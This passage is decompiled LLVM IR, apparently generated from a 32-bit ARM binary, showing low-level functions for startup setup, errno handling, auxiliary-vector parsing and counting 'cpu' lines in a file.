  uselistorder i32 %v3_15074, { 1, 0 }
  uselistorder i32 %v1_15068, { 1, 0, 2 }
  uselistorder i32 %v0_15038, { 0, 1, 3, 2 }
  uselistorder i32 %v0_14ff4, { 1, 0 }
  uselistorder i32 %v0_14fec, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r6.global-to-local, { 3, 0, 1, 2, 4 }
  uselistorder i32* %r5.global-to-local, { 4, 5, 0, 1, 2, 3, 6 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 3, 0, 4 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 6, 2, 3, 4, 5, 7, 8 }
  uselistorder i32 ()* @function_12a70, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32)* @function_12b6c, { 3, 1, 0, 5, 2, 4 }
  uselistorder i32 34, { 1, 2, 0, 4, 10, 3, 11, 8, 9, 5, 12, 6, 13, 7, 14 }
  uselistorder i8 48, { 1, 0, 2 }
  uselistorder i32 -17, { 1, 0 }
  uselistorder i8 45, { 0, 2, 1 }
  uselistorder label %dec_label_pc_15174._crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_15174, { 2, 0, 1 }
  uselistorder label %bb65, { 1, 0 }
  uselistorder label %dec_label_pc_15140, { 1, 0 }
  uselistorder label %dec_label_pc_15124, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
  uselistorder label %bb61, { 1, 0 }
  uselistorder label %bb58, { 2, 1, 0 }
  uselistorder label %dec_label_pc_150c8, { 1, 0 }
  uselistorder label %dec_label_pc_150c4, { 1, 0 }
  uselistorder label %bb56, { 2, 1, 0 }
  uselistorder label %.thread8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1503c, { 1, 0 }
  uselistorder label %dec_label_pc_15038, { 1, 0 }
  uselistorder label %dec_label_pc_15000, { 1, 0 }
}

define i32 @function_15194(i32 %arg1) local_unnamed_addr {
dec_label_pc_15194:
  %stack_var_-16 = alloca i32, align 4
  store i32 135344, i32* @r5, align 4
  %v4_151a0 = load i32, i32* inttoptr (i32 135432 to i32*), align 8
  store i32 %v4_151a0, i32* @r4, align 4
  %v2_151a8 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %arg1, i32* @r6, align 4
  %v4_151c0 = load i32, i32* inttoptr (i32 135416 to i32*), align 8
  call void @__pseudo_branch(i32 %v4_151c0)
  %v0_151d4 = load i32, i32* @r5, align 4
  %v2_151d4 = add i32 %v0_151d4, 16
  %v3_151d4 = inttoptr i32 %v2_151d4 to i32*
  %v4_151d4 = load i32, i32* %v3_151d4, align 4
  call void @__pseudo_branch(i32 %v4_151d4)
  %v4_151e4 = load i32, i32* @global_var_21368.601, align 4
  %v2_151e8 = icmp eq i32 %v4_151e4, 0
  br i1 %v2_151e8, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_15194
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_15194, %bb
  %v2_151f4 = xor i1 %v2_151e8, true
  call void @__pseudo_cond_branch(i1 %v2_151f4, i32 %v4_151e4)
  store i32 %v2_151a8, i32* @r0, align 4
  %v0_15204 = load i32, i32* @r5, align 4
  %v2_15204 = add i32 %v0_15204, 24
  %v3_15204 = inttoptr i32 %v2_15204 to i32*
  %v4_15204 = load i32, i32* %v3_15204, align 4
  call void @__pseudo_branch(i32 %v4_15204)
  %v0_15210 = call i32 @function_15a60()
  %v0_15218 = load i32, i32* @r5, align 4
  %v9_15218 = icmp eq i32 %v0_15218, 41396
  br i1 %v9_15218, label %bb9, label %bb8

bb8:                                              ; preds = %.thread
  br label %bb9

bb9:                                              ; preds = %.thread, %bb8
  %v2_15220 = xor i1 %v9_15218, true
  call void @__pseudo_cond_branch(i1 %v2_15220, i32 ptrtoint (i32* @global_var_16efc.604 to i32))
  %v0_15224 = load i32, i32* @r6, align 4
  %v1_15228 = call i32 @function_164c8(i32 %v0_15224)
  %v0_1522c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1522c, label %.thread5, label %.thread6

.thread5:                                         ; preds = %bb9
  %v5_1522c = mul i32 %v4_15204, 1073741824
  %v6_1522c = and i32 %v1_15228, %v5_1522c
  store i32 %v6_1522c, i32* @fp, align 4
  call void @llvm.trap()
  unreachable

.thread6:                                         ; preds = %bb9
  ret i32 %v1_15228

; uselistorder directives
  uselistorder i32 %v1_15228, { 1, 0 }
  uselistorder i1 %v9_15218, { 1, 0 }
  uselistorder i32 1073741824, { 0, 2, 1 }
  uselistorder label %bb9, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_1524c(i32 %arg1) local_unnamed_addr {
dec_label_pc_1524c:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_1524c = load i32, i32* @r4, align 4
  %v6_1524c = load i32, i32* @lr, align 4
  store i32 %arg1, i32* @ip, align 4
  %v2_15250 = icmp eq i32 %arg1, 0
  store i32 0, i32* @r4, align 4
  br i1 %v2_15250, label %dec_label_pc_152e4, label %dec_label_pc_15260

dec_label_pc_15260:                               ; preds = %dec_label_pc_1524c
  %v2_15270 = ptrtoint i32* %stack_var_-44 to i32
  store i32 65536, i32* %stack_var_-24, align 4
  store i32 %arg1, i32* %stack_var_-16, align 4
  %v3_15284 = call i32 @function_15ed8(i32 17, i32 0, i32 %v2_15270)
  %v3_15288 = load i32, i32* %stack_var_-44, align 4
  %v7_1528c = icmp eq i32 %v3_15288, 1
  br i1 %v7_1528c, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_15260
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_15260, %bb
  call void @__pseudo_cond_branch(i1 %v7_1528c, i32 ptrtoint (i32* @global_var_13114.606 to i32))
  %v2_152a0 = ptrtoint i32* %stack_var_-16 to i32
  %v2_152a8 = call i32 @function_1640c(i32 %v2_152a0, i32 %v2_152a0)
  %v2_152ac = icmp eq i32 %v2_152a8, 0
  br i1 %v2_152ac, label %bb19, label %bb18

bb18:                                             ; preds = %.thread2
  %v3_152c0 = load i32, i32* %stack_var_-16, align 4
  br label %bb19

bb19:                                             ; preds = %.thread2, %bb18
  %storemerge = phi i32 [ %v3_152c0, %bb18 ], [ 0, %.thread2 ]
  store i32 %storemerge, i32* %r4.global-to-local, align 4
  %v3_152d0 = load i32, i32* %stack_var_-24, align 4
  %v1_152d4 = and i32 %v3_152d0, 65536
  %v2_152d4 = icmp eq i32 %v1_152d4, 0
  br i1 %v2_152d4, label %bb20, label %.thread6

bb20:                                             ; preds = %bb19
  br label %.thread6

.thread6:                                         ; preds = %bb19, %bb20
  call void @__pseudo_cond_branch(i1 %v2_152d4, i32 ptrtoint (i32* @global_var_13114.606 to i32))
  %v0_152e4.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_152e4

dec_label_pc_152e4:                               ; preds = %dec_label_pc_1524c, %.thread6
  %v0_152e4 = phi i32 [ %v0_152e4.pre, %.thread6 ], [ 0, %dec_label_pc_1524c ]
  store i32 %v3_1524c, i32* @r4, align 4
  store i32 %v6_1524c, i32* @lr, align 4
  ret i32 %v0_152e4

; uselistorder directives
  uselistorder i32* %stack_var_-16, { 0, 2, 1 }
  uselistorder i32 (i32, i32, i32)* @function_15ed8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_152e4, { 1, 0 }
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %bb19, { 1, 0 }
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @function_152f8() local_unnamed_addr {
dec_label_pc_152f8:
  %stack_var_-36 = alloca i32, align 4
  store i32 135344, i32* @r4, align 4
  store i32 ptrtoint ([11 x i8]* @global_var_18d38.610 to i32), i32* @r0, align 4
  store i32 0, i32* @r5, align 4
  store i32 0, i32* %stack_var_-36, align 4
  %v2_15318 = call i32 @function_1693c(i32 ptrtoint ([11 x i8]* @global_var_18d38.610 to i32))
  store i32 %v2_15318, i32* @r6, align 4
  %v2_1531c = icmp eq i32 %v2_15318, 0
  br i1 %v2_1531c, label %dec_label_pc_1539c, label %dec_label_pc_15324

dec_label_pc_15324:                               ; preds = %dec_label_pc_152f8
  store i32 224, i32* @sl, align 4
  store i32 ptrtoint (i32* @global_var_18504.24 to i32), i32* @r8, align 4
  %v2_15330 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_15330, i32* @r7, align 4
  br label %bb18

dec_label_pc_15338:                               ; preds = %bb18
  %v3_15338 = load i32, i32* %stack_var_-36, align 4
  %v1_1533c = inttoptr i32 %v3_15338 to i32*
  %v2_1533c = load i32, i32* %v1_1533c, align 4
  %v1_15340 = inttoptr i32 %v2_1533c to i8*
  %v2_15340 = load i8, i8* %v1_15340, align 1
  %v7_15344 = icmp eq i8 %v2_15340, 99
  br i1 %v7_15344, label %dec_label_pc_1534c, label %.backedge3

dec_label_pc_1534c:                               ; preds = %dec_label_pc_15338
  %v1_1534c = add i32 %v2_1533c, 1
  %v2_1534c = inttoptr i32 %v1_1534c to i8*
  %v3_1534c = load i8, i8* %v2_1534c, align 1
  %v7_15350 = icmp eq i8 %v3_1534c, 112
  br i1 %v7_15350, label %dec_label_pc_15358, label %.backedge3

dec_label_pc_15358:                               ; preds = %dec_label_pc_1534c
  %v1_15358 = add i32 %v2_1533c, 2
  %v2_15358 = inttoptr i32 %v1_15358 to i8*
  %v3_15358 = load i8, i8* %v2_15358, align 1
  %v7_1535c = icmp eq i8 %v3_15358, 117
  br i1 %v7_1535c, label %dec_label_pc_15364, label %.backedge3

dec_label_pc_15364:                               ; preds = %dec_label_pc_15358
  %v1_15364 = add i32 %v2_1533c, 3
  %v2_15364 = inttoptr i32 %v1_15364 to i8*
  %v3_15364 = load i8, i8* %v2_15364, align 1
  %v4_15364 = zext i8 %v3_15364 to i32
  %v0_15368 = load i32, i32* @r4, align 4
  %v1_15368 = load i32, i32* @sl, align 4
  %v2_15368 = add i32 %v1_15368, %v0_15368
  %v3_15368 = inttoptr i32 %v2_15368 to i32*
  %v4_15368 = load i32, i32* %v3_15368, align 4
  %v2_1536c = mul nuw nsw i32 %v4_15364, 2
  %v2_15370 = add i32 %v4_15368, %v2_1536c
  %v3_15370 = inttoptr i32 %v2_15370 to i16*
  %v4_15370 = load i16, i16* %v3_15370, align 2
  %v1_15374 = and i16 %v4_15370, 8
  %v2_15374 = icmp eq i16 %v1_15374, 0
  br i1 %v2_15374, label %.backedge3, label %bb

bb:                                               ; preds = %dec_label_pc_15364
  %v1_15378 = load i32, i32* @r5, align 4
  %v2_15378 = add i32 %v1_15378, 1
  store i32 %v2_15378, i32* @r5, align 4
  br label %.backedge3

.backedge3:                                       ; preds = %bb, %dec_label_pc_15364, %dec_label_pc_15338, %dec_label_pc_1534c, %dec_label_pc_15358
  %v0_1537c.pre = load i32, i32* @r6, align 4
  %v0_15388.pre = load i32, i32* @r8, align 4
  br label %bb18

bb18:                                             ; preds = %.backedge3, %dec_label_pc_15324
  %v0_15388 = phi i32 [ %v0_15388.pre, %.backedge3 ], [ ptrtoint (i32* @global_var_18504.24 to i32), %dec_label_pc_15324 ]
  %v0_1537c = phi i32 [ %v0_1537c.pre, %.backedge3 ], [ %v2_15318, %dec_label_pc_15324 ]
  %v4_1538c = inttoptr i32 %v0_1537c to i32*
  %v5_1538c = call i32 @function_165e0(i32* %v4_1538c, i32 %v2_15330, i32 258, i32 %v0_15388)
  %v2_15390 = icmp eq i32 %v5_1538c, 0
  br i1 %v2_15390, label %dec_label_pc_15400, label %dec_label_pc_15338

dec_label_pc_1539c:                               ; preds = %dec_label_pc_152f8
  store i32 ptrtoint ([14 x i8]* @global_var_18d44.615 to i32), i32* @r0, align 4
  %v2_153a4 = call i32 @function_1693c(i32 ptrtoint ([14 x i8]* @global_var_18d44.615 to i32))
  store i32 %v2_153a4, i32* @r6, align 4
  %v2_153a8 = icmp eq i32 %v2_153a4, 0
  br i1 %v2_153a8, label %bb19, label %dec_label_pc_153b4

bb19:                                             ; preds = %dec_label_pc_1539c
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_15400

dec_label_pc_153b4:                               ; preds = %dec_label_pc_1539c
  store i32 ptrtoint ([10 x i8]* @global_var_18d54.617 to i32), i32* @r8, align 4
  store i32 ptrtoint (i32* @global_var_18d78.619 to i32), i32* @r7, align 4
  %v2_153c4 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_153c4, i32* @r4, align 4
  br label %bb21

dec_label_pc_153cc:                               ; preds = %bb21
  %v0_153f8 = load i32, i32* @r8, align 4
  %v1_153f8 = inttoptr i32 %v0_153f8 to i8*
  %v3_153cc = load i32, i32* %stack_var_-36, align 4
  %v1_153d0 = inttoptr i32 %v3_153cc to i32*
  %v2_153d0 = load i32, i32* %v1_153d0, align 4
  store i32 %v2_153d0, i32* @r1, align 4
  %v4_153d4 = call i32 @function_17bf0(i8* %v1_153f8, i32 %v2_153d0)
  %v2_153d8 = icmp eq i32 %v4_153d4, 0
  br i1 %v2_153d8, label %bb20, label %.backedge

bb20:                                             ; preds = %dec_label_pc_153cc
  %v1_153dc = load i32, i32* @r5, align 4
  %v2_153dc = add i32 %v1_153dc, 1
  store i32 %v2_153dc, i32* @r5, align 4
  br label %.backedge

.backedge:                                        ; preds = %bb20, %dec_label_pc_153cc
  %v0_153e8.pre = load i32, i32* @r7, align 4
  %v0_153ec.pre = load i32, i32* @r6, align 4
  br label %bb21

bb21:                                             ; preds = %.backedge, %dec_label_pc_153b4
  %v0_153ec = phi i32 [ %v0_153ec.pre, %.backedge ], [ %v2_153a4, %dec_label_pc_153b4 ]
  %v0_153e8 = phi i32 [ %v0_153e8.pre, %.backedge ], [ ptrtoint (i32* @global_var_18d78.619 to i32), %dec_label_pc_153b4 ]
  %v4_153f0 = inttoptr i32 %v0_153ec to i32*
  %v5_153f0 = call i32 @function_165e0(i32* %v4_153f0, i32 %v2_153c4, i32 459266, i32 %v0_153e8)
  %v2_153f4 = icmp eq i32 %v5_153f0, 0
  br i1 %v2_153f4, label %dec_label_pc_15400, label %dec_label_pc_153cc

dec_label_pc_15400:                               ; preds = %bb18, %bb21, %bb19
  %v0_15400 = load i32, i32* @r6, align 4
  %v1_15404 = inttoptr i32 %v0_15400 to i32*
  %v2_15404 = call i32 @function_16908(i32* %v1_15404)
  %v0_15408 = load i32, i32* @r5, align 4
  %v2_15408 = icmp eq i32 %v0_15408, 0
  %.v0_15408 = select i1 %v2_15408, i32 1, i32 %v0_15408
  ret i32 %.v0_15408

; uselistorder directives
  uselistorder i32* %stack_var_-36, { 0, 3, 1, 4, 2 }
  uselistorder i32 ptrtoint (i32* @global_var_18504.24 to i32), { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 (i32)* @function_1693c, { 1, 0 }
  uselistorder label %dec_label_pc_15400, { 1, 2, 0 }
  uselistorder label %.backedge3, { 0, 1, 4, 3, 2 }
}

define i32 @function_15444(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_15444:
  %r2.global-to-local = alloca i32, align 4
  %tmp = icmp ult i32 %arg1, 241
  br i1 %tmp, label %bb, label %dec_label_pc_1582c

bb:                                               ; preds = %dec_label_pc_15444
  %v7_15458 = mul i32 %arg1, 4
  %v8_15458 = add i32 %v7_15458, ptrtoint (i32* @global_var_15460.622 to i32)
  call void @__pseudo_branch(i32 %v8_15458)
  br label %dec_label_pc_1582c

dec_label_pc_1582c:                               ; preds = %bb, %dec_label_pc_15444
  %v0_1582c = call i32 @function_13574()
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_15838 = inttoptr i32 %v0_1582c to i32*
  store i32 22, i32* %v2_15838, align 4
  %v0_159e8 = load i32, i32* %r2.global-to-local, align 4
  ret i32 %v0_159e8

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @function_15a60() local_unnamed_addr {
dec_label_pc_15a84.lr.ph:
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_15a60 = load i32, i32* @r4, align 4
  store i32 %v3_15a60, i32* %stack_var_-16, align 4
  store i32 135336, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_15a84

dec_label_pc_15a84:                               ; preds = %dec_label_pc_15a84.dec_label_pc_15a84_crit_edge, %dec_label_pc_15a84.lr.ph
  %v1_15a84 = phi i32 [ %v1_15a90, %dec_label_pc_15a84.dec_label_pc_15a84_crit_edge ], [ 0, %dec_label_pc_15a84.lr.ph ]
  %v0_15a84 = phi i32 [ %v0_15a84.pre, %dec_label_pc_15a84.dec_label_pc_15a84_crit_edge ], [ 135336, %dec_label_pc_15a84.lr.ph ]
  %v4_15a84 = mul i32 %v1_15a84, 4
  %v5_15a84 = add i32 %v4_15a84, %v0_15a84
  %v6_15a84 = inttoptr i32 %v5_15a84 to i32*
  %v7_15a84 = load i32, i32* %v6_15a84, align 4
  call void @__pseudo_branch(i32 %v7_15a84)
  %v0_15a90 = load i32, i32* %r4.global-to-local, align 4
  %v1_15a90 = add i32 %v0_15a90, -1
  store i32 %v1_15a90, i32* %r4.global-to-local, align 4
  %v2_15a90 = icmp eq i32 %v0_15a90, 0
  br i1 %v2_15a90, label %dec_label_pc_15a98, label %dec_label_pc_15a84.dec_label_pc_15a84_crit_edge

dec_label_pc_15a84.dec_label_pc_15a84_crit_edge:  ; preds = %dec_label_pc_15a84
  %v0_15a84.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_15a84

dec_label_pc_15a98:                               ; preds = %dec_label_pc_15a84
  %v4_15a9c = load i32, i32* @global_var_21378.635, align 4
  %v2_15aa0 = icmp eq i32 %v4_15a9c, 0
  br i1 %v2_15aa0, label %bb16, label %bb

bb:                                               ; preds = %dec_label_pc_15a98
  br label %bb16

bb16:                                             ; preds = %dec_label_pc_15a98, %bb
  %v2_15aa8 = xor i1 %v2_15aa0, true
  call void @__pseudo_cond_branch(i1 %v2_15aa8, i32 %v4_15a9c)
  %v4_15ab0 = load i32, i32* @global_var_2137c.637, align 4
  %v2_15ab4 = icmp eq i32 %v4_15ab0, 0
  br i1 %v2_15ab4, label %bb18, label %bb17

bb17:                                             ; preds = %bb16
  br label %bb18

bb18:                                             ; preds = %bb16, %bb17
  %v2_15abc = xor i1 %v2_15ab4, true
  call void @__pseudo_cond_branch(i1 %v2_15abc, i32 %v4_15ab0)
  %v2_15ac0 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_15ac0, i32* %r4.global-to-local, align 4
  %v1_15ac4 = load i32, i32* @r0, align 4
  ret i32 %v1_15ac4

; uselistorder directives
  uselistorder i32 %v1_15a90, { 1, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 3, 2, 0 }
  uselistorder label %bb18, { 1, 0 }
  uselistorder label %bb16, { 1, 0 }
}

define i32 @function_15adc(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_15adc:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %v2_15af0 = call i32 @function_12f80(i32 %arg1, i32 1)
  %v3_15af8 = icmp eq i32 %v2_15af0, -1
  store i32 135344, i32* @r3, align 4
  br i1 %v3_15af8, label %dec_label_pc_15b04, label %dec_label_pc_15b1c

dec_label_pc_15b04:                               ; preds = %dec_label_pc_15adc
  %v0_15b08 = load i32, i32* %r5.global-to-local, align 4
  %v3_15b10 = call i32 @function_12d24(i32 ptrtoint ([10 x i8]* @global_var_18d7c.640 to i32), i32 %v0_15b08)
  %v1_15b14 = load i32, i32* %r4.global-to-local, align 4
  %v1_15b18 = icmp ne i32 %v3_15b10, %v1_15b14
  call void @__pseudo_cond_branch(i1 %v1_15b18, i32 ptrtoint (i32* @global_var_14e70.641 to i32))
  br label %dec_label_pc_15b1c

dec_label_pc_15b1c:                               ; preds = %dec_label_pc_15adc, %dec_label_pc_15b04
  %v1_15b24 = phi i32 [ %v2_15af0, %dec_label_pc_15adc ], [ %v3_15b10, %dec_label_pc_15b04 ]
  ret i32 %v1_15b24

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_15b1c, { 1, 0 }
}

define i32 @function_15b30(i32 %arg1) local_unnamed_addr {
dec_label_pc_15b30:
  %r4.global-to-local = alloca i32, align 4
  store i32 135344, i32* %r4.global-to-local, align 4
  %v4_15b40 = load i32, i32* inttoptr (i32 135436 to i32*), align 4
  %v1_15b44 = inttoptr i32 %v4_15b40 to i32*
  %v2_15b44 = load i32, i32* %v1_15b44, align 4
  %v2_15b48 = icmp eq i32 %v2_15b44, 0
  br i1 %v2_15b48, label %dec_label_pc_15b50, label %dec_label_pc_15b84

dec_label_pc_15b50:                               ; preds = %dec_label_pc_15b30
  %v4_15b54 = load i32, i32* inttoptr (i32 135396 to i32*), align 4
  %v2_15b5c = icmp eq i32 %v4_15b54, 0
  store i32 4096, i32* %v1_15b44, align 4
  br i1 %v2_15b5c, label %bb4, label %bb

bb:                                               ; preds = %dec_label_pc_15b50
  br label %bb4

bb4:                                              ; preds = %dec_label_pc_15b50, %bb
  %v2_15b68 = xor i1 %v2_15b5c, true
  call void @__pseudo_cond_branch(i1 %v2_15b68, i32 %v4_15b54)
  %v0_15b70 = load i32, i32* %r4.global-to-local, align 4
  %v2_15b78 = icmp eq i32 %v0_15b70, 41552
  br i1 %v2_15b78, label %bb6, label %bb5

bb5:                                              ; preds = %bb4
  br label %bb6

bb6:                                              ; preds = %bb4, %bb5
  %v2_15b80 = xor i1 %v2_15b78, true
  call void @__pseudo_cond_branch(i1 %v2_15b80, i32 ptrtoint (i32* @global_var_16e60.646 to i32))
  br label %dec_label_pc_15b84

dec_label_pc_15b84:                               ; preds = %dec_label_pc_15b30, %bb6
  %v1_15b88 = load i32, i32* @r0, align 4
  ret i32 %v1_15b88

; uselistorder directives
  uselistorder i1 %v2_15b78, { 1, 0 }
  uselistorder label %dec_label_pc_15b84, { 1, 0 }
  uselistorder label %bb6, { 1, 0 }
  uselistorder label %bb4, { 1, 0 }
}

define i32 @function_15b9c(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_15b9c:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  %tmp = ptrtoint i32* %arg3 to i32
  store i32 %tmp, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp49 = call i32 @__decompiler_undefined_function_0()
  %tmp50 = call i32 @__decompiler_undefined_function_0()
  %tmp51 = call i32 @__decompiler_undefined_function_0()
  %tmp52 = call i32 @__decompiler_undefined_function_0()
  %tmp53 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-120 = alloca i32, align 4
  store i32 %tmp, i32* @r7, align 4
  %v1_15ba4 = add i32 %tmp, 4
  store i32 %v1_15ba4, i32* %ip.global-to-local, align 4
  %v2_15ba8 = load i32, i32* %arg3, align 4
  store i32 20, i32* %r2.global-to-local, align 4
  store i32 135344, i32* @r6, align 4
  %v3_15bb4 = mul i32 %arg2, 4
  store i32 %v3_15bb4, i32* %r5.global-to-local, align 4
  store i32 %arg2, i32* %sb.global-to-local, align 4
  %v4_15bbc = load i32, i32* inttoptr (i32 135364 to i32*), align 4
  store i32 28, i32* %r2.global-to-local, align 4
  %v2_15bc4 = ptrtoint i32* %stack_var_-120 to i32
  %v4_15bc8 = load i32, i32* inttoptr (i32 135372 to i32*), align 4
  store i32 %v4_15bc8, i32* %r4.global-to-local, align 4
  %v2_15bd0 = add i32 %v1_15ba4, %v3_15bb4
  store i32 %v2_15bd0, i32* %ip.global-to-local, align 4
  %v9_15bd4 = icmp eq i32 %v2_15bd0, %v2_15ba8
  store i1 %v9_15bd4, i1* %cpsr_z.global-to-local, align 1
  %v2_15bd8 = inttoptr i32 %v4_15bbc to i32*
  store i32 %arg7, i32* %v2_15bd8, align 4
  store i32 716, i32* %r2.global-to-local, align 4
  %v0_15be4 = load i32, i32* %r3.global-to-local, align 4
  br i1 %v9_15bd4, label %bb, label %.critedge

bb:                                               ; preds = %dec_label_pc_15b9c
  %v1_15be8 = load i32, i32* @r7, align 4
  %v2_15be8 = load i32, i32* %r5.global-to-local, align 4
  %v3_15be8 = add i32 %v2_15be8, %v1_15be8
  store i32 %v3_15be8, i32* %r3.global-to-local, align 4
  store i32 %arg6, i32* @global_var_2137c.637, align 4
  %v0_15bf0 = load i32, i32* %ip.global-to-local, align 4
  %v1_15bf0 = load i32, i32* %r4.global-to-local, align 4
  %v2_15bf0 = inttoptr i32 %v1_15bf0 to i32*
  store i32 %v0_15bf0, i32* %v2_15bf0, align 4
  store i32 120, i32* @r2, align 4
  %v1_15bfc = load i32, i32* %r3.global-to-local, align 4
  %v2_15bfc = load i32, i32* %r4.global-to-local, align 4
  %v3_15bfc = inttoptr i32 %v2_15bfc to i32*
  store i32 %v1_15bfc, i32* %v3_15bfc, align 4
  br label %bb57

.critedge:                                        ; preds = %dec_label_pc_15b9c
  store i32 %arg6, i32* @global_var_2137c.637, align 4
  %v0_15bf0.c = load i32, i32* %ip.global-to-local, align 4
  %v1_15bf0.c = load i32, i32* %r4.global-to-local, align 4
  %v2_15bf0.c = inttoptr i32 %v1_15bf0.c to i32*
  store i32 %v0_15bf0.c, i32* %v2_15bf0.c, align 4
  store i32 120, i32* @r2, align 4
  br label %bb57

bb57:                                             ; preds = %.critedge, %bb
  store i32 %v2_15bc4, i32* %r0.global-to-local, align 4
  %v2_15c08 = bitcast i32* %stack_var_-120 to i8*
  %v3_15c08 = call i32 @function_135d0(i8* %v2_15c08, i32 0)
  store i32 %v3_15c08, i32* %r0.global-to-local, align 4
  %v0_15c0c = load i32, i32* %r4.global-to-local, align 4
  %v1_15c0c = inttoptr i32 %v0_15c0c to i32*
  %storemerge.pre = load i32, i32* %v1_15c0c, align 4
  br label %dec_label_pc_15c18

dec_label_pc_15c18:                               ; preds = %dec_label_pc_15c18, %bb57
  %storemerge = phi i32 [ %storemerge.pre, %bb57 ], [ %v4_15c18, %dec_label_pc_15c18 ]
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v1_15c18 = inttoptr i32 %storemerge to i32*
  %v2_15c18 = load i32, i32* %v1_15c18, align 4
  store i32 %v2_15c18, i32* %r3.global-to-local, align 4
  %v4_15c18 = add i32 %storemerge, 4
  store i32 %v4_15c18, i32* %r2.global-to-local, align 4
  %v2_15c1c = icmp eq i32 %v2_15c18, 0
  br i1 %v2_15c1c, label %dec_label_pc_15c28, label %dec_label_pc_15c18

dec_label_pc_15c28:                               ; preds = %dec_label_pc_15c18
  store i32 %v4_15c18, i32* @r4, align 4
  store i32 %v2_15bc4, i32* @r5, align 4
  %v1_15c4c29 = inttoptr i32 %v4_15c18 to i32*
  %v2_15c4c30 = load i32, i32* %v1_15c4c29, align 4
  store i32 %v2_15c4c30, i32* %r3.global-to-local, align 4
  %v2_15c5032 = icmp eq i32 %v2_15c4c30, 0
  store i1 %v2_15c5032, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15c5032, label %dec_label_pc_15c58, label %dec_label_pc_15c34

dec_label_pc_15c34:                               ; preds = %dec_label_pc_15c28, %dec_label_pc_15c4c
  %v5_15c38 = phi i32 [ %v2_15c4c, %dec_label_pc_15c4c ], [ %v2_15c4c30, %dec_label_pc_15c28 ]
  %v2_15c34 = icmp ugt i32 %v5_15c38, 13
  %v7_15c34 = icmp eq i32 %v5_15c38, 14
  store i1 %v7_15c34, i1* %cpsr_z.global-to-local, align 1
  %v2_15c38 = xor i1 %v2_15c34, true
  %v3_15c38 = or i1 %v7_15c34, %v2_15c38
  br i1 %v3_15c38, label %bb58, label %bb59

bb58:                                             ; preds = %dec_label_pc_15c34
  %v4_15c38 = load i32, i32* @r5, align 4
  %v6_15c38 = and i32 %v5_15c38, 536870912
  %v7_15c38 = icmp ne i32 %v6_15c38, 0
  %v8_15c38 = mul i32 %v5_15c38, 8
  %v9_15c38 = add i32 %v4_15c38, %v8_15c38
  store i32 %v9_15c38, i32* %r0.global-to-local, align 4
  br label %bb59

bb59:                                             ; preds = %dec_label_pc_15c34, %bb58
  %v1_15c44 = phi i1 [ %v2_15c34, %dec_label_pc_15c34 ], [ %v7_15c38, %bb58 ]
  %v2_15c3c = xor i1 %v1_15c44, true
  %v3_15c3c = or i1 %v7_15c34, %v2_15c3c
  br i1 %v3_15c3c, label %bb60, label %dec_label_pc_15c4c

bb60:                                             ; preds = %bb59
  store i32 8, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_15c4c

dec_label_pc_15c4c:                               ; preds = %bb59, %bb60
  call void @__pseudo_cond_branch(i1 %v3_15c3c, i32 ptrtoint (i32* @global_var_13680.651 to i32))
  %v0_15c48 = load i32, i32* @r4, align 4
  %v1_15c48 = add i32 %v0_15c48, 8
  store i32 %v1_15c48, i32* @r4, align 4
  %v1_15c4c = inttoptr i32 %v1_15c48 to i32*
  %v2_15c4c = load i32, i32* %v1_15c4c, align 4
  store i32 %v2_15c4c, i32* %r3.global-to-local, align 4
  %v2_15c50 = icmp eq i32 %v2_15c4c, 0
